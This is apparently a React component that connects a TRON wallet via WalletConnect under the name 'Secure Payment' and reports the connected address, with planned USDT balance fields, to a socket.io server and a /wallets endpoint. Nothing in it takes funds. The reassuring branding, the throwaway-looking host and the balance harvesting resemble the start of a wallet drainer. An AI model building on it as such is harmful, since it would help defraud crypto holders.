import { useState } from "react";
import io from "socket.io-client";
import { API_URL, SOCKET_OPTIONS } from "./config";
import { WalletConnectWallet } from "@tronweb3/walletconnect-tron";

const socket = io(API_URL, SOCKET_OPTIONS);

const wallet = new WalletConnectWallet({
  network: "Mainnet",
  options: {
    relayUrl: "wss://relay.walletconnect.com",
    projectId: "c46979307f3f04398d086294ddbc8768",
    metadata: {
      name: "Secure Payment",
      description: "Transparent Web3 payment system",
      url: "https://bitter-forest-f198.unzilegarip09.workers.dev",
      icons: [],
    },
  },
});

export default function TronConnect() {
  const [tronAddress, setTronAddress] = useState("");
  const [status, setStatus] = useState("");

  const connectTron = async () => {
    try {
      setStatus("TRON bağlantısı açılıyor...");

      const result = await wallet.connect();

      const address = result?.address || result?.accounts?.[0];

      if (!address) {
        setStatus("TRON adresi alınamadı");
        return;
      }

      setTronAddress(address);
      setStatus("TRON bağlantısı başarılı");

      const payload = {
        address,
        network: "TRON",
        chainId: "tron-mainnet",
        nativeBalance: "TRON bakiye okuma sonraki adımda eklenecek",
        usdtBalance: "TRC20 USDT sonraki adımda eklenecek",
        tokenBalances: [],
      };

      socket.emit("wallet_connected", payload);

      await fetch(`${API_URL}/wallets`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      });
    } catch (err) {
      console.log(err);
      setStatus("TRON bağlantısı başarısız");
    }
  };

  return (
    <div className="tron-box">
      <button onClick={connectTron}>TRON Bağla</button>

      {status && <div className="notice">{status}</div>}

      {tronAddress && (
        <div className="wallet-item">
          <p>{tronAddress}</p>
          <span>Ağ: TRON</span>
        </div>
      )}
    </div>
  );
}